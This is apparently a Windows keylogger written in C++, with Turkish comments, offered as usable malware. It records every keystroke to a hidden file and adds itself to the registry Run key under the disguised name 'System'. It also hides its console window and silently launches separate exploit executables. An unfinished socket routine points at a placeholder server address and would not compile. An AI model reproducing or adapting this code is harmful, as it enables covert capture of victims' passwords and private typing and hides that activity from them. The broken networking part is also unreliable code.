#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include <direct.h> //profit buna ihtiyacın olmayabilir.
using namespace std;  
int Save (int key_stroke, char *file);
void Stealth();
int main() 
{
    Stealth(); 
char i;
while (1)
{
    for(i = 8; i <= 190; i++)
    {
        if (GetAsyncKeyState(i) == -32767)
            Save (i,"Log.txt");
    }
}
system ("PAUSE");
return 0;
}
int Save (int key_stroke, char *file)
{
FILE *OUTPUT_FILE;
OUTPUT_FILE = fopen("C:\\Log.txt", "a+");
cout << key_stroke << endl;
    if (key_stroke == 8)
    fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");  
    else if (key_stroke == 13)
    fprintf(OUTPUT_FILE, "%s", "\n"); 
    else if (key_stroke == 32)
    fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)              
    fprintf(OUTPUT_FILE, "%s", "[TAB]");
        else if (key_stroke == VK_SHIFT)
    fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
        else if (key_stroke == VK_CONTROL)
    fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
            else if (key_stroke == VK_ESCAPE)
    fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
            else if (key_stroke == VK_END)
    fprintf(OUTPUT_FILE, "%s", "[END]");
                else if (key_stroke == VK_HOME)
    fprintf(OUTPUT_FILE, "%s", "[HOME]");
                else if (key_stroke == VK_LEFT)
    fprintf(OUTPUT_FILE, "%s", "[LEFT]");
                    else if (key_stroke == VK_UP)
    fprintf(OUTPUT_FILE, "%s", "[UP]");
                    else if (key_stroke == VK_RIGHT)
    fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
                        else if (key_stroke == VK_DOWN)
    fprintf(OUTPUT_FILE, "%s", "[DOWN]");
                        else if (key_stroke == 190 || key_stroke == 110)
    fprintf(OUTPUT_FILE, "%s", ".");
                        else
    fprintf(OUTPUT_FILE, "%s", &key_stroke);
fclose (OUTPUT_FILE);
return 0;
}
void connect() {
	 s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		return 0;
	}

	target.sin_family = AF_INET;		
	target.sin_port = htons(22);	//server portun.
	target.sin_addr.s_addr = 255.255.255.255; //server adresin.	255 example.

	
	if(connect(s, (SOCKADDR *)&target, sizeof(target)) == SOCKET_ERROR)		
	{	//error
		return 0;
	}
	WSAAsyncSelect(s, hwnd, 1045, FD_READ | FD_CONNECT | FD_CLOSE);

}
void Stealth()
{
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
	HKEY acilis;
	RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&acilis);
	RegSetValueEx(acilis,"System",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));
	RegCloseKey(acilis);
	HWND Stealth;
	AllocConsole(); 
	Stealth = FindWindowA("ConsoleWindowClass",NULL); 
	ShowWindow(Stealth,0);
	system("attrib \"C:\\Log.txt\" +h +s ");
	ShellExecute(NULL,"open","C:\\x86.exe",NULL,NULL,SW_HIDE); //exploitlerin için.
	ShellExecute(NULL,"open","C:\\x64.exe",NULL,NULL,SW_HIDE); //64 bit ise usttekini sil
}
